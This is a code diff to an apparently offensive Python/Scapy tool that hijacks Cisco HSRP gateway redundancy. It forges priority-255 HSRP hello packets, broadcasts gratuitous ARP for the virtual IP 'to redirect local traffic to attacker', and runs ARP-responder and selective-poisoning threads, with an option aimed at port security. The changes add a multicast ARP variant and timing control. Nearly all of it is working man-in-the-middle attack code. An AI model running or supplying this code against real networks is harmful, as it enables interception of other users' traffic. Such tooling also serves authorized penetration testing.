@@ -180,18 +180,19 @@ def send_hsrp(packet):
         pkt = Ether(dst=etherdst, src=ethersrc)/IP(dst=ipdst, ttl=ipttl)/UDP(sport=sport, dport=dport)/HSRP(opcode=op, state=16, hellotime=hellotime, holdtime=holdtime, priority=255, group=group, auth=auth, virtualIP=virtualIP)
         # Mimic sending pattern of cisco HSRP routers with 2 ARP broadcast
         sendp(pkt, verbose=False)
-        send_initial_arp(packet)
+        send_initial_arp(0, False)
+        send_initial_arp(1, True)
         pkt[HSRP].opcode = 0
 
         sendp(pkt, verbose=False)
-        send_initial_arp(packet)
+        send_initial_arp(0, True)
         arp_thread = threading.Thread(target=start_arp_responder, args=(pkcopy), daemon=True)
         arp_thread.start()
         selective_poison = threading.Thread(target=start_selective_poisoning, args=(pkcopy), daemon=True)
         selective_poison.start()
         sendp(pkt, inter=packet[HSRP].hellotime, loop=1, verbose=False)
     else:
-        # TODO Extract bytes from HSRP packet using script, do not hard code HSRP bytes
+        # TODO Extract bytes from HSRP packet using script, do not hard code HSRP bytes. Someone work on this pls thanks
         payloadHSRP = b'\x02\x00\x06\x04\x00\x01\x5c\x71\x0d\xbd\x87\xc7\x00\x00\x00\xff\x00\x00\x0b\xb8\x00\x00\x27\x10\xc0\xa8\x01\xfe\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
         payloadText = b'cisco\x00\x00\x00'
         ###################################
@@ -204,9 +205,10 @@ def send_hsrp(packet):
         pkt = eth/ip/udp/groupTlv/textTlv
         print("Hijacking HSRPv2...")
         sendp(pkt, verbose=False)
-        send_initial_arp(packet)
+        send_initial_arp(0, False)
+        send_initial_arp(1, True)
         sendp(pkt, verbose=False)
-        send_initial_arp(packet)
+        send_initial_arp(0, True)
         arp_thread = threading.Thread(target=start_arp_responder, args=(pkcopy), daemon=True)
         arp_thread.start()
         selective_poison = threading.Thread(target=start_selective_poisoning, args=(pkcopy), daemon=True)
@@ -214,21 +216,34 @@ def send_hsrp(packet):
         sendp(pkt, iface=interface, inter=3, loop=1, verbose=False)
 
 # Send arp with HSRP virtual ip to redirect local traffic to attacker
-def send_initial_arp(packet):
+def send_initial_arp(type, pause=True):
+    '''Send arp with HSRP virtual ip to redirect local traffic to attacker. 
+    
+    Can choose to send as broadcast or send to stp uplinkfast based on arguments'''
     if attackportsecurity:
         ethersrc = mymac
     else:
         # use HSRP mac if not attacking port security
-        ethersrc = packet[Ether].src
+        ethersrc = pkcopy[Ether].src
     if version == 1:
-        virtualIP = packet[HSRP].virtualIP
-        hellotime = packet[HSRP].hellotime
+        virtualIP = pkcopy[HSRP].virtualIP
+        hellotime = pkcopy[HSRP].hellotime
     else:
         ################
         virtualIP = "192.168.1.254"
         hellotime = 3
-    pkt = Ether(src=ethersrc, dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, hwsrc=ethersrc, psrc=virtualIP, hwdst="ff:ff:ff:ff:ff:ff", pdst=virtualIP)
-    sendp(pkt, inter=hellotime, verbose=False)
+    if type == 0:
+        etherdst = "ff:ff:ff:ff:ff:ff"
+    elif type == 1:
+        etherdst = "01:00:0c:cd:cd:cd"
+    if pause:
+        interval = hellotime
+    else:
+        interval = 0
+    # opcode for reply
+    opcode = 2
+    pkt = Ether(src=ethersrc, dst=etherdst)/ARP(op=opcode, hwsrc=ethersrc, psrc=virtualIP, hwdst=etherdst, pdst=virtualIP)
+    sendp(pkt, inter=interval, verbose=False)
 
 def start_arp_responder(packet):
     '''sniff and respond to arp request for HSRP virtual ip address from network'''
@@ -243,7 +258,7 @@ def start_arp_responder(packet):
     sniff(prn=arp_respond, filter=filterstring)
 
 def arp_respond(packet):
-    '''Called by sniff() in start_arp_responder to send arp response to any request for HSRP virtual ip address, if matching rules in start_arp_responder'''
+    '''Called by sniff() in start_arp_responder to send unicast arp response to any request for HSRP virtual ip address, if matching rules in start_arp_responder'''
     if version == 1:
         virtualIP = pkcopy[HSRP].virtualIP
     else:
